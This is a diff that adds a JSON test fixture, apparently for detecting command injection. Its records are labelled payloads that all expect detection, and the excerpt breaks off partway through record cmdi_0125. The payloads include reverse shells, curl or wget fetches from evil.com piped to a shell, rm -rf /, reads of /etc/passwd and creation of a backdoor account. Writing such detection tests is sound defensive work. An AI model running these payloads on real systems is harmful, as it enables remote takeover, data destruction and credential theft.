@@ -1,0 +1,1802 @@
+[
+  {
+    "id": "cmdi_0000",
+    "type": "command_injection",
+    "payload": "; whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.1.104.252",
+    "timestamp": "2026-03-13T21:21:36.763088"
+  },
+  {
+    "id": "cmdi_0001",
+    "type": "command_injection",
+    "payload": "| rm -rf /*",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "189.253.57.132",
+    "timestamp": "2026-03-13T21:18:56.763095"
+  },
+  {
+    "id": "cmdi_0002",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "50.233.44.112",
+    "timestamp": "2026-03-13T21:20:17.763101"
+  },
+  {
+    "id": "cmdi_0003",
+    "type": "command_injection",
+    "payload": "| netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "57.77.133.206",
+    "timestamp": "2026-03-13T20:33:19.763107"
+  },
+  {
+    "id": "cmdi_0004",
+    "type": "command_injection",
+    "payload": "| nc -e /bin/sh 10.0.0.1 4444",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "81.154.16.29",
+    "timestamp": "2026-03-13T21:16:26.763113"
+  },
+  {
+    "id": "cmdi_0005",
+    "type": "command_injection",
+    "payload": "| rm -rf /*",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "79.245.159.36",
+    "timestamp": "2026-03-13T21:07:14.763119"
+  },
+  {
+    "id": "cmdi_0006",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "163.224.103.76",
+    "timestamp": "2026-03-13T20:57:29.763127"
+  },
+  {
+    "id": "cmdi_0007",
+    "type": "command_injection",
+    "payload": "| netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "119.157.77.89",
+    "timestamp": "2026-03-13T20:58:50.763136"
+  },
+  {
+    "id": "cmdi_0008",
+    "type": "command_injection",
+    "payload": "| whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "90.135.100.211",
+    "timestamp": "2026-03-13T20:49:44.763143"
+  },
+  {
+    "id": "cmdi_0009",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "162.86.161.248",
+    "timestamp": "2026-03-13T20:34:11.763151"
+  },
+  {
+    "id": "cmdi_0010",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "90.107.122.66",
+    "timestamp": "2026-03-13T20:30:29.763157"
+  },
+  {
+    "id": "cmdi_0011",
+    "type": "command_injection",
+    "payload": "| netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "131.24.93.189",
+    "timestamp": "2026-03-13T20:30:24.763163"
+  },
+  {
+    "id": "cmdi_0012",
+    "type": "command_injection",
+    "payload": "; id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "190.84.241.152",
+    "timestamp": "2026-03-13T20:40:43.763169"
+  },
+  {
+    "id": "cmdi_0013",
+    "type": "command_injection",
+    "payload": "; ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "61.178.1.76",
+    "timestamp": "2026-03-13T21:03:30.763175"
+  },
+  {
+    "id": "cmdi_0014",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "34.9.57.33",
+    "timestamp": "2026-03-13T20:52:00.763181"
+  },
+  {
+    "id": "cmdi_0015",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "36.202.23.9",
+    "timestamp": "2026-03-13T20:30:08.763187"
+  },
+  {
+    "id": "cmdi_0016",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "109.41.107.136",
+    "timestamp": "2026-03-13T21:01:18.763192"
+  },
+  {
+    "id": "cmdi_0017",
+    "type": "command_injection",
+    "payload": "; python -c 'import socket...'",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "129.1.79.151",
+    "timestamp": "2026-03-13T20:35:35.763198"
+  },
+  {
+    "id": "cmdi_0018",
+    "type": "command_injection",
+    "payload": "; netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "56.172.145.121",
+    "timestamp": "2026-03-13T21:17:12.763204"
+  },
+  {
+    "id": "cmdi_0019",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "175.130.138.131",
+    "timestamp": "2026-03-13T20:52:51.763210"
+  },
+  {
+    "id": "cmdi_0020",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "49.104.55.238",
+    "timestamp": "2026-03-13T21:15:17.763216"
+  },
+  {
+    "id": "cmdi_0021",
+    "type": "command_injection",
+    "payload": "| rm -rf /*",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "51.81.146.63",
+    "timestamp": "2026-03-13T21:18:15.763221"
+  },
+  {
+    "id": "cmdi_0022",
+    "type": "command_injection",
+    "payload": "| nc -e /bin/sh 10.0.0.1 4444",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "215.182.142.216",
+    "timestamp": "2026-03-13T21:09:16.763227"
+  },
+  {
+    "id": "cmdi_0023",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "200.200.41.210",
+    "timestamp": "2026-03-13T20:32:04.763233"
+  },
+  {
+    "id": "cmdi_0024",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "80.235.113.138",
+    "timestamp": "2026-03-13T20:33:10.763238"
+  },
+  {
+    "id": "cmdi_0025",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "1.160.3.107",
+    "timestamp": "2026-03-13T21:19:36.763244"
+  },
+  {
+    "id": "cmdi_0026",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "35.202.103.225",
+    "timestamp": "2026-03-13T21:21:06.763252"
+  },
+  {
+    "id": "cmdi_0027",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "57.154.153.254",
+    "timestamp": "2026-03-13T20:45:48.763258"
+  },
+  {
+    "id": "cmdi_0028",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "40.211.31.204",
+    "timestamp": "2026-03-13T20:36:16.763264"
+  },
+  {
+    "id": "cmdi_0029",
+    "type": "command_injection",
+    "payload": "`ls -la`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "138.54.173.208",
+    "timestamp": "2026-03-13T20:52:43.763270"
+  },
+  {
+    "id": "cmdi_0030",
+    "type": "command_injection",
+    "payload": "; wget http://evil.com/malware.sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "87.132.66.1",
+    "timestamp": "2026-03-13T20:33:15.763275"
+  },
+  {
+    "id": "cmdi_0031",
+    "type": "command_injection",
+    "payload": "; cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "70.57.83.202",
+    "timestamp": "2026-03-13T21:06:17.763283"
+  },
+  {
+    "id": "cmdi_0032",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "39.170.94.243",
+    "timestamp": "2026-03-13T21:17:25.763289"
+  },
+  {
+    "id": "cmdi_0033",
+    "type": "command_injection",
+    "payload": "; wget http://evil.com/malware.sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "205.28.152.227",
+    "timestamp": "2026-03-13T20:44:32.763295"
+  },
+  {
+    "id": "cmdi_0034",
+    "type": "command_injection",
+    "payload": "|| ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "68.148.234.193",
+    "timestamp": "2026-03-13T20:55:00.763301"
+  },
+  {
+    "id": "cmdi_0035",
+    "type": "command_injection",
+    "payload": "| dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "139.238.112.200",
+    "timestamp": "2026-03-13T20:38:51.763307"
+  },
+  {
+    "id": "cmdi_0036",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "213.244.236.241",
+    "timestamp": "2026-03-13T21:17:59.763313"
+  },
+  {
+    "id": "cmdi_0037",
+    "type": "command_injection",
+    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "140.198.38.145",
+    "timestamp": "2026-03-13T21:04:14.763318"
+  },
+  {
+    "id": "cmdi_0038",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.72.30.1",
+    "timestamp": "2026-03-13T21:12:37.763324"
+  },
+  {
+    "id": "cmdi_0039",
+    "type": "command_injection",
+    "payload": "; ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "202.44.15.28",
+    "timestamp": "2026-03-13T21:02:03.763330"
+  },
+  {
+    "id": "cmdi_0040",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "64.110.210.160",
+    "timestamp": "2026-03-13T20:33:18.763336"
+  },
+  {
+    "id": "cmdi_0041",
+    "type": "command_injection",
+    "payload": "| nc -e /bin/sh 10.0.0.1 4444",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "95.42.21.30",
+    "timestamp": "2026-03-13T20:33:52.763341"
+  },
+  {
+    "id": "cmdi_0042",
+    "type": "command_injection",
+    "payload": "; python -c 'import socket...'",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "217.161.213.40",
+    "timestamp": "2026-03-13T20:31:07.763347"
+  },
+  {
+    "id": "cmdi_0043",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.161.39.167",
+    "timestamp": "2026-03-13T20:53:37.763353"
+  },
+  {
+    "id": "cmdi_0044",
+    "type": "command_injection",
+    "payload": "; cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "6.148.16.158",
+    "timestamp": "2026-03-13T20:58:07.763358"
+  },
+  {
+    "id": "cmdi_0045",
+    "type": "command_injection",
+    "payload": "`id`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "161.107.204.95",
+    "timestamp": "2026-03-13T20:30:44.763367"
+  },
+  {
+    "id": "cmdi_0046",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "212.33.140.155",
+    "timestamp": "2026-03-13T21:20:51.763373"
+  },
+  {
+    "id": "cmdi_0047",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "116.87.210.10",
+    "timestamp": "2026-03-13T21:02:49.763378"
+  },
+  {
+    "id": "cmdi_0048",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "14.255.204.162",
+    "timestamp": "2026-03-13T20:57:48.763386"
+  },
+  {
+    "id": "cmdi_0049",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "17.89.90.49",
+    "timestamp": "2026-03-13T21:02:08.763392"
+  },
+  {
+    "id": "cmdi_0050",
+    "type": "command_injection",
+    "payload": "; curl http://evil.com/backdoor | sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "174.246.145.206",
+    "timestamp": "2026-03-13T21:11:45.763398"
+  },
+  {
+    "id": "cmdi_0051",
+    "type": "command_injection",
+    "payload": "; cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "13.163.69.65",
+    "timestamp": "2026-03-13T21:22:02.763403"
+  },
+  {
+    "id": "cmdi_0052",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "117.59.114.3",
+    "timestamp": "2026-03-13T20:36:07.763412"
+  },
+  {
+    "id": "cmdi_0053",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "51.26.112.214",
+    "timestamp": "2026-03-13T21:22:14.763418"
+  },
+  {
+    "id": "cmdi_0054",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "98.84.206.144",
+    "timestamp": "2026-03-13T20:32:31.763424"
+  },
+  {
+    "id": "cmdi_0055",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "164.97.45.247",
+    "timestamp": "2026-03-13T21:12:32.763429"
+  },
+  {
+    "id": "cmdi_0056",
+    "type": "command_injection",
+    "payload": "; id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "120.214.117.49",
+    "timestamp": "2026-03-13T20:42:23.763435"
+  },
+  {
+    "id": "cmdi_0057",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "62.151.221.35",
+    "timestamp": "2026-03-13T20:33:58.763440"
+  },
+  {
+    "id": "cmdi_0058",
+    "type": "command_injection",
+    "payload": "; $(echo bHMgLWxh | base64 -d)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "41.78.206.146",
+    "timestamp": "2026-03-13T21:20:44.763446"
+  },
+  {
+    "id": "cmdi_0059",
+    "type": "command_injection",
+    "payload": "; rm -rf /",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "80.81.181.23",
+    "timestamp": "2026-03-13T20:43:35.763452"
+  },
+  {
+    "id": "cmdi_0060",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "65.81.118.84",
+    "timestamp": "2026-03-13T20:31:39.763457"
+  },
+  {
+    "id": "cmdi_0061",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "14.139.137.132",
+    "timestamp": "2026-03-13T21:11:17.763463"
+  },
+  {
+    "id": "cmdi_0062",
+    "type": "command_injection",
+    "payload": "; cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "146.127.213.168",
+    "timestamp": "2026-03-13T20:38:46.763469"
+  },
+  {
+    "id": "cmdi_0063",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "159.229.201.34",
+    "timestamp": "2026-03-13T20:44:53.763475"
+  },
+  {
+    "id": "cmdi_0064",
+    "type": "command_injection",
+    "payload": "; $(echo bHMgLWxh | base64 -d)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "69.54.89.199",
+    "timestamp": "2026-03-13T21:03:46.763480"
+  },
+  {
+    "id": "cmdi_0065",
+    "type": "command_injection",
+    "payload": "; curl http://evil.com/backdoor | sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "171.7.6.107",
+    "timestamp": "2026-03-13T20:45:22.763489"
+  },
+  {
+    "id": "cmdi_0066",
+    "type": "command_injection",
+    "payload": "& powershell -c \"IEX(New-Object Net.WebClient)...\"",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "163.8.71.13",
+    "timestamp": "2026-03-13T20:37:47.763494"
+  },
+  {
+    "id": "cmdi_0067",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "99.28.195.96",
+    "timestamp": "2026-03-13T21:06:31.763500"
+  },
+  {
+    "id": "cmdi_0068",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "10.213.55.62",
+    "timestamp": "2026-03-13T21:11:46.763506"
+  },
+  {
+    "id": "cmdi_0069",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "139.96.222.40",
+    "timestamp": "2026-03-13T20:42:16.763511"
+  },
+  {
+    "id": "cmdi_0070",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "141.254.203.90",
+    "timestamp": "2026-03-13T20:51:27.763517"
+  },
+  {
+    "id": "cmdi_0071",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "123.98.199.223",
+    "timestamp": "2026-03-13T21:16:35.763523"
+  },
+  {
+    "id": "cmdi_0072",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "133.166.17.145",
+    "timestamp": "2026-03-13T21:08:44.763528"
+  },
+  {
+    "id": "cmdi_0073",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "217.53.19.103",
+    "timestamp": "2026-03-13T20:53:46.763536"
+  },
+  {
+    "id": "cmdi_0074",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "177.199.46.26",
+    "timestamp": "2026-03-13T21:07:48.763542"
+  },
+  {
+    "id": "cmdi_0075",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "164.83.165.63",
+    "timestamp": "2026-03-13T20:37:55.763547"
+  },
+  {
+    "id": "cmdi_0076",
+    "type": "command_injection",
+    "payload": "; python -c 'import socket...'",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "12.79.182.138",
+    "timestamp": "2026-03-13T20:40:48.763553"
+  },
+  {
+    "id": "cmdi_0077",
+    "type": "command_injection",
+    "payload": "; curl http://evil.com/backdoor | sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "35.4.163.168",
+    "timestamp": "2026-03-13T20:44:07.763559"
+  },
+  {
+    "id": "cmdi_0078",
+    "type": "command_injection",
+    "payload": "; wget http://evil.com/malware.sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.149.101.101",
+    "timestamp": "2026-03-13T20:49:28.763565"
+  },
+  {
+    "id": "cmdi_0079",
+    "type": "command_injection",
+    "payload": "| nc -e /bin/sh 10.0.0.1 4444",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "206.90.153.167",
+    "timestamp": "2026-03-13T21:09:23.763570"
+  },
+  {
+    "id": "cmdi_0080",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "96.20.67.83",
+    "timestamp": "2026-03-13T20:26:40.763576"
+  },
+  {
+    "id": "cmdi_0081",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "77.165.227.151",
+    "timestamp": "2026-03-13T21:13:25.763582"
+  },
+  {
+    "id": "cmdi_0082",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "190.213.172.70",
+    "timestamp": "2026-03-13T21:04:14.763588"
+  },
+  {
+    "id": "cmdi_0083",
+    "type": "command_injection",
+    "payload": "; netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "45.29.150.89",
+    "timestamp": "2026-03-13T20:50:09.763593"
+  },
+  {
+    "id": "cmdi_0084",
+    "type": "command_injection",
+    "payload": "& net user attacker password123 /add",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.70.39.141",
+    "timestamp": "2026-03-13T20:48:31.763601"
+  },
+  {
+    "id": "cmdi_0085",
+    "type": "command_injection",
+    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "124.172.36.124",
+    "timestamp": "2026-03-13T20:44:01.763607"
+  },
+  {
+    "id": "cmdi_0086",
+    "type": "command_injection",
+    "payload": "; rm -rf /",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "150.204.187.20",
+    "timestamp": "2026-03-13T21:21:07.763613"
+  },
+  {
+    "id": "cmdi_0087",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "182.226.190.21",
+    "timestamp": "2026-03-13T21:20:09.763618"
+  },
+  {
+    "id": "cmdi_0088",
+    "type": "command_injection",
+    "payload": "; ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "47.89.155.202",
+    "timestamp": "2026-03-13T21:11:15.763624"
+  },
+  {
+    "id": "cmdi_0089",
+    "type": "command_injection",
+    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "36.184.98.192",
+    "timestamp": "2026-03-13T21:14:30.763630"
+  },
+  {
+    "id": "cmdi_0090",
+    "type": "command_injection",
+    "payload": "| rm -rf /*",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "205.116.206.12",
+    "timestamp": "2026-03-13T21:06:07.763636"
+  },
+  {
+    "id": "cmdi_0091",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.78.163.58",
+    "timestamp": "2026-03-13T20:32:02.763668"
+  },
+  {
+    "id": "cmdi_0092",
+    "type": "command_injection",
+    "payload": "; ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "23.23.247.223",
+    "timestamp": "2026-03-13T21:01:43.763675"
+  },
+  {
+    "id": "cmdi_0093",
+    "type": "command_injection",
+    "payload": "; curl http://evil.com/backdoor | sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "126.230.116.146",
+    "timestamp": "2026-03-13T20:54:37.763681"
+  },
+  {
+    "id": "cmdi_0094",
+    "type": "command_injection",
+    "payload": "& powershell -c \"IEX(New-Object Net.WebClient)...\"",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "84.43.208.1",
+    "timestamp": "2026-03-13T20:46:44.763689"
+  },
+  {
+    "id": "cmdi_0095",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "90.91.224.224",
+    "timestamp": "2026-03-13T20:38:06.763695"
+  },
+  {
+    "id": "cmdi_0096",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "218.243.87.138",
+    "timestamp": "2026-03-13T20:35:02.763701"
+  },
+  {
+    "id": "cmdi_0097",
+    "type": "command_injection",
+    "payload": "; id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "16.91.50.155",
+    "timestamp": "2026-03-13T20:50:58.763706"
+  },
+  {
+    "id": "cmdi_0098",
+    "type": "command_injection",
+    "payload": "| whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "169.188.13.217",
+    "timestamp": "2026-03-13T21:19:33.763712"
+  },
+  {
+    "id": "cmdi_0099",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "13.32.150.148",
+    "timestamp": "2026-03-13T21:21:45.763721"
+  },
+  {
+    "id": "cmdi_0100",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "109.100.41.157",
+    "timestamp": "2026-03-13T20:31:01.763726"
+  },
+  {
+    "id": "cmdi_0101",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "88.237.120.130",
+    "timestamp": "2026-03-13T20:27:01.763732"
+  },
+  {
+    "id": "cmdi_0102",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "85.197.212.25",
+    "timestamp": "2026-03-13T20:50:22.763738"
+  },
+  {
+    "id": "cmdi_0103",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "121.119.246.8",
+    "timestamp": "2026-03-13T20:47:49.763744"
+  },
+  {
+    "id": "cmdi_0104",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "135.142.86.69",
+    "timestamp": "2026-03-13T20:33:16.763752"
+  },
+  {
+    "id": "cmdi_0105",
+    "type": "command_injection",
+    "payload": "; rm -rf /",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "112.155.57.106",
+    "timestamp": "2026-03-13T20:53:02.763758"
+  },
+  {
+    "id": "cmdi_0106",
+    "type": "command_injection",
+    "payload": "; $(echo bHMgLWxh | base64 -d)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "193.159.39.153",
+    "timestamp": "2026-03-13T20:24:41.763763"
+  },
+  {
+    "id": "cmdi_0107",
+    "type": "command_injection",
+    "payload": "| rm -rf /*",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "44.190.245.173",
+    "timestamp": "2026-03-13T21:21:25.763769"
+  },
+  {
+    "id": "cmdi_0108",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "118.47.77.246",
+    "timestamp": "2026-03-13T21:15:33.763775"
+  },
+  {
+    "id": "cmdi_0109",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.189.91.92",
+    "timestamp": "2026-03-13T21:00:50.763781"
+  },
+  {
+    "id": "cmdi_0110",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "1.188.158.202",
+    "timestamp": "2026-03-13T20:26:48.763786"
+  },
+  {
+    "id": "cmdi_0111",
+    "type": "command_injection",
+    "payload": "; whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "212.92.100.141",
+    "timestamp": "2026-03-13T20:56:27.763792"
+  },
+  {
+    "id": "cmdi_0112",
+    "type": "command_injection",
+    "payload": "; python -c 'import socket...'",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "10.126.81.43",
+    "timestamp": "2026-03-13T21:17:11.763798"
+  },
+  {
+    "id": "cmdi_0113",
+    "type": "command_injection",
+    "payload": "; cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "79.64.121.191",
+    "timestamp": "2026-03-13T21:23:47.763803"
+  },
+  {
+    "id": "cmdi_0114",
+    "type": "command_injection",
+    "payload": "; whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "1.161.241.152",
+    "timestamp": "2026-03-13T20:44:18.763809"
+  },
+  {
+    "id": "cmdi_0115",
+    "type": "command_injection",
+    "payload": "; rm -rf /",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "128.69.4.90",
+    "timestamp": "2026-03-13T20:36:39.763815"
+  },
+  {
+    "id": "cmdi_0116",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "15.234.93.183",
+    "timestamp": "2026-03-13T21:18:55.763824"
+  },
+  {
+    "id": "cmdi_0117",
+    "type": "command_injection",
+    "payload": "& net user attacker password123 /add",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "218.167.35.60",
+    "timestamp": "2026-03-13T20:55:20.763833"
+  },
+  {
+    "id": "cmdi_0118",
+    "type": "command_injection",
+    "payload": "`id`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "77.226.107.219",
+    "timestamp": "2026-03-13T21:10:20.763840"
+  },
+  {
+    "id": "cmdi_0119",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "129.140.86.62",
+    "timestamp": "2026-03-13T20:56:19.763846"
+  },
+  {
+    "id": "cmdi_0120",
+    "type": "command_injection",
+    "payload": "| dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "184.232.165.27",
+    "timestamp": "2026-03-13T21:02:49.763851"
+  },
+  {
+    "id": "cmdi_0121",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "7.210.2.100",
+    "timestamp": "2026-03-13T21:12:25.763857"
+  },
+  {
+    "id": "cmdi_0122",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "56.3.99.237",
+    "timestamp": "2026-03-13T20:58:49.763863"
+  },
+  {
+    "id": "cmdi_0123",
+    "type": "command_injection",
+    "payload": "| ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "216.188.3.174",
+    "timestamp": "2026-03-13T21:12:18.763873"
+  },
+  {
+    "id": "cmdi_0124",
+    "type": "command_injection",
+    "payload": "; ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "154.45.161.196",
+    "timestamp": "2026-03-13T20:58:43.763880"
+  },
+  {
+    "id": "cmdi_0125",
+    "type": "command_injection",
+    "payload": "| netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
